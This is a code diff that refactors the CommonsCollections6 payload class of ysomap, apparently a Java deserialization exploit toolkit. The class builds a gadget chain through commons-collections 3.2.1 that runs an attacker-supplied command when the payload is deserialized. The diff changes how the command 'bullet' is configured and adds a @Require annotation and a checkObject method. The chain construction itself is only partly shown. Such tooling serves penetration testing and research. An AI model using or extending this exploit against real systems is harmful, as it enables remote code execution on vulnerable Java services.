@@ -3,11 +3,11 @@ package ysomap.gadget.payload.collections;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.map.LazyMap;
-import ysomap.exception.GenerateErrorException;
-import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
+import ysomap.annotation.Require;
 import ysomap.gadget.ObjectGadget;
+import ysomap.gadget.bullet.Bullet;
 import ysomap.gadget.bullet.collections.TransformerBullet;
 import ysomap.gadget.payload.Payload;
 import ysomap.serializer.Serializer;
@@ -24,9 +24,15 @@ import java.util.Map;
  * @since 2020/2/18
  */
 @SuppressWarnings({"rawtypes","unchecked"})
+@Require(bullets = {"TransformerBullet","TransformerWithTemplatesImplBullet","TransformerWithResponseBullet"})
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
 @Authors({Authors.SCRISTALLI, Authors.HANYRAX, Authors.EDOARDOVIGNATI})
 public class CommonsCollections6 extends Payload<Hashtable> {
+
+    @Override
+    public boolean checkObject(Object obj) {
+        return obj instanceof Transformer[];
+    }
 
     @Override
     public Serializer<?> getSerializer() {
@@ -61,15 +67,11 @@ public class CommonsCollections6 extends Payload<Hashtable> {
     }
 
     @Override
-    public ObjectGadget getDefaultBullet(String command) {
-        return new TransformerBullet(command, "3");
-    }
-
-    public static void main(String[] args) throws GenerateErrorException {
-//        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null, "3");
-        ObjectGadget bullet = new TransformerBullet(null, "3");
-        new PayloadTester(CommonsCollections6.class)
-                .setBullet(bullet)
-                .run();
+    public ObjectGadget getDefaultBullet(String command) throws Exception {
+        //ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null, "3");
+        Bullet bullet = new TransformerBullet();
+        bullet.set("args", command);
+        bullet.set("version", "3");
+        return bullet;
     }
 }
